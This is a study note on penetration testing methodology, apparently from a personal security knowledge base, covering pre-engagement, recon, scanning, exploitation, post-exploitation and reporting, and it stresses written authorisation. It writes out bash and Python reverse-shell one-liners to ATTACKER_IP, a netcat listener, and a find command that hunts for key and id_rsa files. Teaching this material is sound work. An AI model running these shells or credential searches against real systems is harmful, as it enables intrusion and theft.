---
title: Penetration Testing Methodology
tags: '["secops", "fundamentals", "pentest", "methodology", "recon",
  "exploitation", "intermediate"]'
created: 2026-03-23
folder: 01-Fundamentals
status: complete
difficulty: intermediate
source: PTES, NIST SP 800-115, OWASP Testing Guide, EC-Council CEH
---

# Penetration Testing Methodology

> A penetration test is an authorised, simulated attack on a system to identify exploitable vulnerabilities before real attackers do. Methodology is what separates a professional pentest from random hacking.

---

## The Pentest Lifecycle

```
1. Pre-Engagement
      ↓
2. Reconnaissance
      ↓
3. Scanning & Enumeration
      ↓
4. Exploitation
      ↓
5. Post-Exploitation
      ↓
6. Reporting
      ↓
7. Remediation & Retest
```

---

## Phase 1 — Pre-Engagement

Everything before touching a single system. The most legally important phase.

**Deliverables:**
- **Rules of Engagement (RoE)** — what is in/out of scope, permitted techniques, blackout windows
- **Statement of Work (SoW)** — contractual scope and deliverables
- **Permission/authorisation letter** — signed, explicit written permission to test
- **Emergency contacts** — who to call if something breaks

**Scope considerations:**
- IP ranges and domains in scope
- Excluded systems (production databases, life-safety systems)
- Testing hours (business hours only? 24/7?)
- Techniques permitted (DoS? Social engineering? Physical?)

> Without written authorisation, penetration testing is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide.

---

## Phase 2 — Reconnaissance

Gathering intelligence without directly interacting with target systems (passive) or with limited interaction (active).

### Passive Recon
- **WHOIS** — domain registration info
- **DNS records** — A, MX, TXT, NS, CNAME via `dig`, `nslookup`
- **Google Dorks** — `site:target.com filetype:pdf`, `inurl:admin`
- **Shodan** — internet-facing devices and open ports
- **LinkedIn/OSINT** — employee names, tech stack, org structure
- **Certificate transparency logs** — `crt.sh` for subdomain enumeration
- **Wayback Machine** — archived versions of the site
- **theHarvester** — emails, subdomains, hosts from public sources

### Active Recon
- DNS zone transfers: `dig axfr @nameserver target.com`
- Subdomain brute-forcing: `ffuf`, `gobuster dns`
- Web crawling and spidering
- Banner grabbing: `nc target.com 80`, `curl -I`

---

## Phase 3 — Scanning and Enumeration

Actively probing systems to map the attack surface.

### Network Scanning
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Full port scan
nmap -p- -T4 target.com

# Service/version detection + default scripts
nmap -sV -sC -p 22,80,443,3306 target.com

# OS detection
nmap -O target.com

# Output all formats
nmap -sV -oA scan_results target.com
```

### Service Enumeration

| Port | Service | Enumeration Technique |
|---|---|---|
| 21 | FTP | Anonymous login, banner grab |
| 22 | SSH | Version, user enumeration |
| 25 | SMTP | VRFY/EXPN commands |
| 80/443 | HTTP/S | Dir brute-force, tech detection |
| 139/445 | SMB | `enum4linux`, `smbclient`, shares |
| 389 | LDAP | Null bind, user enumeration |
| 3306 | MySQL | Default creds, version |
| 5985 | WinRM | Password spray |

### Web Enumeration
```bash
# Directory brute-force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/common.txt

# Parameter fuzzing
ffuf -u http://target.com/page?FUZZ=value -w wordlist.txt

# Technology fingerprinting
whatweb http://target.com
```

---

## Phase 4 — Exploitation

Leveraging identified vulnerabilities to gain unauthorised access.

### Vulnerability Research
- Cross-reference findings with CVE databases (NVD, ExploitDB, Vulhub)
- Check service versions against known exploits
- `searchsploit apache 2.4.49` — local ExploitDB search

### Exploitation Frameworks
- **Metasploit** — module-based exploitation framework
- **Manual exploitation** — custom scripts, proof-of-concept code
- **Burp-Suite** — web application exploitation

### Common Exploitation Paths
- Unpatched CVEs in services
- Default/weak credentials
- SQL injection → OS command execution
- File upload → webshell
- Buffer overflow in legacy services
- Misconfigured services (anonymous FTP, SMB null sessions)

### Getting a Shell
```bash
# Netcat listener
nc -lvnp 4444

# Reverse shell (bash)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Phase 5 — Post-Exploitation

What you do after gaining initial access. The most valuable phase for demonstrating real business impact.

### Immediate Actions
- Stabilise shell (upgrade to fully interactive TTY)
- Document exact access level and timestamp
- Avoid actions that could cause damage or data loss

### Local Enumeration
```bash
# Who are we?
id && whoami

# What can we sudo?
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Interesting files
find / -name "*.conf" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
```

### Privilege Escalation
- Linux: [[Linux-Privilege-Escalation]]
- Windows: [[Windows-Privilege-Escalation]]

### Lateral Movement
- Pass-the-Hash (Windows)
- SSH key reuse
- Credential harvesting from config files
- [[Active-Directory]] attacks: Kerberoasting, AS-REP roasting

### Persistence (if in scope)
- Adding SSH keys
- Scheduled tasks / cron jobs
- New user accounts

### Data Exfiltration (demonstrate impact)
- Identify sensitive data (PII, credentials, IP)
- Document what could be exfiltrated — do not actually exfiltrate in most engagements

---

## Phase 6 — Reporting

The deliverable that justifies the engagement. A pentest without a clear report has no value.

### Report Structure
1. **Executive Summary** — business-language risk summary for leadership
2. **Scope and Methodology** — what was tested and how
3. **Findings** — each vulnerability with:
   - Title and CVSS score
   - Description
   - Evidence (screenshots, request/response)
   - Business impact
   - Remediation recommendation
4. **Risk Matrix** — visual summary of findings by severity
5. **Appendices** — raw scan output, tool versions, timeline

### CVSS Scoring Basics
- **Critical** — 9.0–10.0 — RCE, unauthenticated full compromise
- **High** — 7.0–8.9 — significant data exposure, privilege escalation
- **Medium** — 4.0–6.9 — limited impact, requires user interaction
- **Low** — 0.1–3.9 — minimal risk, defence in depth issues
- **Informational** — 0.0 — best practice recommendations

---

## Phase 7 — Remediation and Retest

- Provide remediation guidance per finding
- Allow client time to fix
- Retest confirmed findings to verify fixes
- Issue updated report confirming remediation status

---

## Pentest Types

| Type | Description |
|---|---|
| Black Box | No prior knowledge — simulates external attacker |
| Grey Box | Partial knowledge (credentials, architecture docs) |
| White Box | Full knowledge — source code, infrastructure diagrams |
| Red Team | Full adversary simulation, including physical/social |
| Purple Team | Red and blue team collaborate in real time |

---

## Legal and Ethical Boundaries

- Always operate within the signed scope
- Do not access out-of-scope systems even if you can reach them
- Do not exfiltrate real sensitive data
- Immediately report critical findings (active breach, 0-day in production)
- Cease testing if unexpected damage occurs and notify client

---

## Related Notes
- Web-Application-Testing
- Active-Directory
- Linux-Privilege-Escalation
- Windows-Privilege-Escalation
- Nmap
- Metasploit
- Burp-Suite
- Netcat

## Sources

Penetration Testing Execution Standard. (n.d.). *PTES technical guidelines*. PTES. http://www.pentest-standard.org/

National Institute of Standards and Technology. (2008). *Technical guide to information security testing and assessment* (NIST SP 800-115). U.S. Department of Commerce. https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf

OWASP Foundation. (2023). *OWASP testing guide v4.2*. OWASP. https://owasp.org/www-project-web-security-testing-guide/

## See Also

- CIA-Triad
- Incident-Response
- Nmap
- Metasploit
- Netcat
- Linux-Privilege-Escalation
- Windows-Privilege-Escalation
- Active-Directory
- Web-Application-Testing

---
<- [[Fundamentals-MOC]]